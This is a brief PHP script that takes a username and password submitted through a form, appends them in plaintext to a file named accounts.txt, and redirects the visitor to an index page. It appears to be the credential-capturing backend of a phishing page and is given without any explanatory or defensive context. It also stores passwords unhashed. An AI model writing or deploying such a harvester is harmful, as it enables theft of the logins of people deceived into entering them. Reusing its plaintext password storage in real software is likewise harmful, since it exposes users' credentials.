<?php
  $username = $_POST["username"];
  $password = $_POST["password"];
  $output = fopen("./accounts.txt", "a");
  $output_string = $username . " " . $password . "\n";
  fwrite($output, $output_string);
  fclose($output);
  header("Location: /index.html");
  ?>
